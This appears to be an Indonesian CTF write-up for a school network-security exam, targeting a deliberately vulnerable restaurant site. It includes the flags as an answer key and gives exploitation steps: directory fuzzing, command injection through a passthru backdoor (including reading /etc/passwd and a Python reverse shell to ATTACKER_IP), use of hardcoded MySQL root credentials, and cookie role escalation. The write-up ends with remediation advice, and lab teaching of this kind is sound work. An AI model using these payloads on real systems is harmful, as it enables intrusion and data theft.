# Uprak Keamanan Jaringan 2023 - CTF Writeup

## Deskripsi Aplikasi

Aplikasi ini adalah website restoran "Ayam Gulung Jaya Abadi" yang dijalankan menggunakan Docker Compose dengan 2 service:
- **PHP Apache** (port 80) — hosting website
- **MySQL** (port 3306) — database dengan root password `super-secret-password`

---

## Soal & Clue

### Soal 1 — Flag 1 (Easy)
Website restoran ini menyimpan sebuah flag tersembunyi di halaman utamanya. Temukan flag tersebut!

> **Clue:** Tidak semua yang ada di halaman web terlihat oleh mata. Ada bagian yang hanya bisa dilihat jika kamu membuka "balik layar" halaman tersebut. Coba klik kanan dan lihat source code-nya.

---

### Soal 2 — Flag 2 (Medium)
Sebuah file PHP di server ini memiliki celah keamanan yang memungkinkan kamu menjalankan perintah langsung di server. Temukan dan eksploitasi celah tersebut untuk mendapatkan flag!

> **Clue:** Setelah melakukan directory fuzzing, kamu akan menemukan `door.php` yang mengarahkan ke `shell.php`. File tersebut menampilkan sebuah fungsi PHP yang mengeksekusi input dari URL parameter. Coba masukkan command Linux sederhana seperti `whoami` sebagai parameter-nya, lalu baca file flag yang ada di server.

---

### Soal 3 — Flag 3 (Medium)
Halaman utama website ini memiliki sebuah panel admin tersembunyi yang hanya bisa diakses oleh admin. Naikkan hak akses kamu untuk mendapatkan flag!

> **Clue:** Buka DevTools (F12) dan periksa tab Application > Cookies. Website ini secara otomatis menyimpan cookie `role` dengan value `user`. Ubah value tersebut agar kamu dianggap sebagai admin, lalu refresh halaman.

### Soal 4 -- Flag Home 
Temukan Flag 4 di direktory home

---

## Flag

| Flag | Lokasi |
|------|--------|
| `UPRAK26{always-check-the-sourcecode-99e4c8121cd7d4b0d4c6f388df4e4c82}` | HTML comment di `index.html` |
| `UPRAK26{Shell-from-Vulnerable-GET-Parameter_d6e25e15fd34ff42eb202a099ed39709}` | Command injection di `shell.php` |
| `UPRAK26{cookie-manipulation-is-fun-a1b2c3d4e5f6}` | Cookie manipulation (`role=admin`) di `index.html` |

---

## Langkah-Langkah Pentest

### 1. Reconnaissance (Pengintaian)

#### a. Port Scanning
```bash
nmap -sC -sV -p- <target-ip>
```
- Menemukan port 80 (HTTP/Apache) dan port 3306 (MySQL) terbuka.

#### b. Directory / File Fuzzing
```bash
dirb http://<target-ip>
# atau
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```
- Menemukan file-file tersembunyi: `door.php`, `shell.php`, `index(2).html`, `flag03.txt`.

---

### 2. Flag 1 — Source Code Inspection

Buka `http://<target-ip>/index.html`, lalu lihat source code halaman (Ctrl+U atau klik kanan > View Page Source).

Ditemukan flag tersembunyi di dalam HTML comment pada menu terakhir:
```html
<!--UPRAK26{always-check-the-sourcecode-99e4c8121cd7d4b0d4c6f388df4e4c82}-->
```

> **Pelajaran:** Selalu periksa source code halaman web. Developer sering meninggalkan informasi sensitif di dalam HTML comment.

---

### 3. Enumerasi File Tersembunyi

#### a. Halaman `index(2).html`
- Berisi teks "welcome, hackers!" dengan background gambar `index.png`.
- Cek apakah ada steganografi pada `index.png` menggunakan tools seperti `steghide` atau `binwalk`.

```bash
# Download gambar
wget http://<target-ip>/index.png

# Cek dengan binwalk
binwalk index.png

# Ekstrak dengan steghide (jika ada embedded data)
steghide extract -sf index.png
```

#### b. File `door.php`
- Berisi link ke `shell.php?id=0`.
- Mengarahkan kita ke file `shell.php` yang merupakan celah command injection.

---

### 4. Flag 2 — Command Injection via `shell.php`

Buka `http://<target-ip>/shell.php`. Halaman ini menampilkan teks:
```
passthru($_GET['id'])
```

Ini adalah petunjuk bahwa parameter `id` langsung dieksekusi sebagai command di server tanpa filter apapun.

#### a. Test Command Injection
```
http://<target-ip>/shell.php?id=whoami
```
- Akan menampilkan user yang menjalankan web server (biasanya `www-data`).

#### b. Eksploitasi — Baca flag
```
http://<target-ip>/shell.php?id=cat+/var/www/html/flag03.txt
```
- Flag muncul: `UPRAK26{Shell-from-Vulnerable-GET-Parameter_d6e25e15fd34ff42eb202a099ed39709}`

#### c. Command injection lainnya (untuk demonstrasi)
```bash
# Lihat daftar file
http://<target-ip>/shell.php?id=ls+-la

# Lihat informasi sistem
http://<target-ip>/shell.php?id=uname+-a

# Baca file /etc/passwd
http://<target-ip>/shell.php?id=cat+/etc/passwd

# Reverse shell (DANGER - hanya untuk lab)
http://<target-ip>/shell.php?id=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> **Pelajaran:** Fungsi PHP `passthru()`, `exec()`, `system()` jangan pernah menerima input langsung dari user tanpa sanitasi. Selalu gunakan whitelist atau escape input.

---

### 5. Database Enumeration

Dari `docker-compose.yml`, ditemukan kredensial MySQL:
- **User:** `root`
- **Password:** `super-secret-password`
- **Database:** `my-wonderful-website`

#### a. Koneksi MySQL dari luar (karena port 3306 di-expose)
```bash
mysql -h <target-ip> -u root -p'super-secret-password'
```

#### b. Eksplorasi database
```sql
SHOW DATABASES;
USE `my-wonderful-website`;
SHOW TABLES;
SELECT * FROM <table_name>;
```

> **Pelajaran:** Jangan pernah expose port database ke publik dan gunakan password yang kuat.

---

### 6. Flag 3 — Cookie Manipulation (Role Escalation)

Halaman `index.html` secara otomatis men-set cookie `role=user` saat pertama kali dikunjungi. Halaman ini memiliki Admin Panel tersembunyi yang hanya muncul jika cookie `role=admin` terdeteksi.

#### a. Inspeksi cookie via DevTools
- Buka `http://<target-ip>/index.html`
- Buka DevTools (F12) > tab Application > Cookies
- Ditemukan cookie `role=user` yang di-set otomatis

#### b. Manipulasi cookie untuk mendapatkan flag
- Di DevTools > Console, jalankan:
```javascript
document.cookie = "role=admin; path=/";
```
- Atau ubah langsung value cookie `role` dari `user` ke `admin` di panel Cookies
- Refresh halaman
- Admin Panel muncul dengan flag: `UPRAK26{cookie-manipulation-is-fun-a1b2c3d4e5f6}`

> **Pelajaran:**
> - Jangan rely pada client-side cookie untuk authorization
> - Validasi role/permission harus dilakukan di server-side
> - Cookie bisa dimanipulasi oleh user kapan saja melalui DevTools

---

### 7. Ringkasan Kerentanan

| No | Kerentanan | File | Tingkat |
|----|-----------|------|---------|
| 1 | Sensitive data in HTML comment | `index.html` | Low |
| 2 | OS Command Injection | `shell.php` | **Critical** |
| 3 | Hardcoded credentials | `docker-compose.yml` | **High** |
| 4 | Database port exposed | `docker-compose.yml` | High |
| 5 | Client-side cookie authorization | `index.html` | **Medium** |
| 6 | Possible steganography | `index.png` | Info |

---

### 7. Rekomendasi Perbaikan

1. **Hapus `shell.php` dan `door.php`** — file ini adalah backdoor yang sangat berbahaya.
2. **Jangan gunakan `passthru()` dengan input user** — jika diperlukan, gunakan `escapeshellarg()` atau `escapeshellcmd()`.
3. **Hapus flag dan komentar tersembunyi** dari source code.
4. **Jangan expose port MySQL** ke publik — hapus `ports: "3306:3306"` atau batasi dengan firewall.
5. **Ganti password MySQL** dengan yang lebih kuat dan gunakan environment variable / secret manager.
6. **Jangan gunakan cookie untuk authorization** — validasi role/permission harus dilakukan di server-side, bukan client-side.
7. **Implementasi Web Application Firewall (WAF)** untuk memfilter malicious input.
